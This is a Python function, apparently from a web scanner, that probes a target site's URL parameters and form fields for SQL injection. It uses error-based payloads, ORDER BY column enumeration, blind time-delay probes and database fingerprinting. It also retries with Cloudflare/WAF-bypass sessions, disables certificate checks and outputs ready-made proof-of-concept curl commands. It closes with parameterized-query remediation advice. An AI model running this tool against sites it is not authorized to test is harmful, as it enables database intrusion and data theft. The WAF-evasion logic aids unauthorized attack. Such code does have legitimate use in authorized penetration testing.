def _sqli_engine_sync(url: str, forms: list, params: dict, progress_cb=None) -> dict:
    """
    Real SQLi test across:
    - URL query parameters
    - Form POST fields
    Phase 1: Error-based  → column enumeration
    Phase 2: Blind time-based (3s delay)
    Phase 3: DB fingerprinting from error strings
    """
    result = {
        "vulnerable": False,
        "type":       None,    # error|blind
        "db_type":    None,
        "param":      None,
        "payload":    None,
        "poc":        None,    # full PoC URL/curl
        "columns":    None,
        "evidence":   None,
        "fix":        [],
    }
    tid  = threading.get_ident()
    with _scan_req_lock: _scan_req_counter[tid] = 0
    # CF/WAF bypass: try multiple strategies
    waf_detected = False
    sess = None
    for _cf_attempt in range(4):
        try:
            _s = _make_session(10, cf_bypass=(_cf_attempt > 0), attempt=_cf_attempt)
            base_r = _s.get(url, timeout=10, verify=False, allow_redirects=True)
            if base_r.status_code not in (403, 406, 429, 503):
                sess = _s
                break
            import time as _time; _time.sleep(0.5 + _cf_attempt * 0.3)
        except Exception:
            continue
    if sess is None:
        sess = _make_cf_session(3)  # last resort: full CF session
    try:
        base_r = sess.get(url, timeout=10, verify=False)
        if base_r.status_code in (403, 406, 429, 503):
            waf_detected = True
            result["waf_blocked"] = True
    except Exception:
        pass

    # Collect all injection targets
    targets = []
    for p in params:
        targets.append({"kind": "GET", "param": p, "url": url, "form": None})
    for form in forms:
        for p in form["inputs"]:
            if form["inputs"][p] in ("Submit", "on"):
                continue
            targets.append({"kind": "POST", "param": p, "url": form["action"], "form": form})

    if not targets:
        targets.append({"kind": "GET", "param": "_path", "url": url + "?id=1", "form": None})

    if progress_cb:
        progress_cb(f"💉 SQLi: {len(targets)} targets × {len(_SQLI_ERROR_PAYLOADS)} payloads")

    # ── Phase 1: Error-based ─────────────────────────────────────────────────
    for t in targets:
        for payload, desc in _SQLI_ERROR_PAYLOADS:
            try:
                if t["kind"] == "GET":
                    test_url = _inject_param(t["url"], t["param"], payload)
                    r = _throttled_get(sess, test_url, tid, allow_redirects=True)
                else:
                    data = dict(t["form"]["inputs"])
                    data[t["param"]] = payload
                    r = _throttled_post(sess, t["url"], tid, data=data, allow_redirects=True)
                    test_url = t["url"]

                body = r.text
                if _is_error_response(body):
                    # DB fingerprint
                    db = "Unknown"
                    for db_name, db_sigs in _SQLI_DB_FINGERPRINT.items():
                        if any(sig in body.lower() for sig in db_sigs):
                            db = db_name
                            break

                    # Extract error snippet for evidence
                    lower = body.lower()
                    for sig in sum(_SQLI_DB_FINGERPRINT.values(), []):
                        idx = lower.find(sig)
                        if idx != -1:
                            evidence = body[max(0, idx-20):idx+120].strip()
                            break
                    else:
                        evidence = body[:200]

                    # Build PoC
                    if t["kind"] == "GET":
                        poc = f"GET {test_url}"
                    else:
                        poc_data = "&".join(f"{k}={v}" for k, v in {**t["form"]["inputs"], t["param"]: payload}.items())
                        poc = f"POST {t['url']}\nBody: {poc_data}"

                    # Column count enumeration via ORDER BY
                    col_count = None
                    for n in range(1, 11):
                        ob_payload = f"1' ORDER BY {n}--"
                        try:
                            if t["kind"] == "GET":
                                ob_url = _inject_param(t["url"], t["param"], ob_payload)
                                ob_r = _throttled_get(sess, ob_url, tid)
                            else:
                                ob_data = dict(t["form"]["inputs"])
                                ob_data[t["param"]] = ob_payload
                                ob_r = _throttled_post(sess, t["url"], tid, data=ob_data)
                            if _is_error_response(ob_r.text):
                                col_count = n - 1
                                break
                        except Exception:
                            break

                    result.update({
                        "vulnerable": True,
                        "type":       "error-based",
                        "db_type":    db,
                        "param":      t["param"],
                        "payload":    payload,
                        "desc":       desc,
                        "poc":        poc,
                        "columns":    col_count,
                        "evidence":   evidence[:300],
                    })
                    return result

            except Exception:
                continue

    # ── Phase 2: Blind time-based ────────────────────────────────────────────
    if progress_cb:
        progress_cb("⏱️ SQLi blind time-based probe...")

    for t in targets[:3]:  # limit to 3 targets for speed
        for payload, delay in _SQLI_BLIND_PAYLOADS:
            try:
                t0 = time.monotonic()
                if t["kind"] == "GET":
                    test_url = _inject_param(t["url"], t["param"], payload)
                    r = sess.get(test_url, timeout=delay + 5)
                else:
                    data = dict(t["form"]["inputs"])
                    data[t["param"]] = payload
                    r = sess.post(t["url"], data=data, timeout=delay + 5)
                    test_url = t["url"]
                elapsed = time.monotonic() - t0

                if elapsed >= delay - 0.5:
                    db = "MySQL" if "SLEEP" in payload else ("MSSQL" if "WAITFOR" in payload
                         else ("PostgreSQL" if "pg_sleep" in payload
                         else ("Oracle" if "RECEIVE_MESSAGE" in payload
                         else ("SQLite" if "RANDOMBLOB" in payload else "Unknown"))))
                    poc = (f"curl -s '{test_url}'" if t["kind"] == "GET"
                           else f"curl -s -X POST '{t['url']}' -d '{payload}'")
                    result.update({
                        "vulnerable": True,
                        "type":       "blind-time",
                        "db_type":    db,
                        "param":      t["param"],
                        "payload":    payload,
                        "desc":       f"Response delay {elapsed:.1f}s ≥ {delay}s",
                        "poc":        poc,
                        "columns":    None,
                        "evidence":   f"Response took {elapsed:.2f}s (expected {delay}s)",
                    })
                    return result
            except requests.exceptions.Timeout:
                elapsed = delay + 5
                if elapsed >= delay:
                    result.update({
                        "vulnerable": True,
                        "type":       "blind-time",
                        "db_type":    "Unknown",
                        "param":      t["param"],
                        "payload":    payload,
                        "desc":       f"Request timed out — likely {delay}s delay triggered",
                        "poc":        f"Payload: `{payload}` on param `{t['param']}`",
                        "columns":    None,
                        "evidence":   "Request timed out after delay injection",
                    })
                    return result
            except Exception:
                continue

    # ✅ FIX v51: fix list ကို vulnerable ဖြစ်မှသာ inject လုပ်သည်
    # Not vulnerable → fix list မပေး (UI ရှုပ်မသွားဖို့)
    if result.get("vulnerable"):
        result["fix"] = [
            "Use prepared statements / parameterized queries:",
            "  PHP PDO: `$stmt = $pdo->prepare('SELECT * FROM t WHERE id=?'); $stmt->execute([$id]);`",
            "  Python: `cursor.execute('SELECT * FROM t WHERE id=%s', (id,))`",
            "  Node.js: `db.query('SELECT * FROM t WHERE id=?', [id])`",
            "Use ORM (Eloquent, SQLAlchemy, Sequelize) — auto-escape",
            "Whitelist input: `if (!ctype_digit($id)) die('Invalid');`",
            "Minimum privilege DB user (SELECT only where possible)",
            "Disable error display in production: `display_errors=Off`",
        ]
    return result


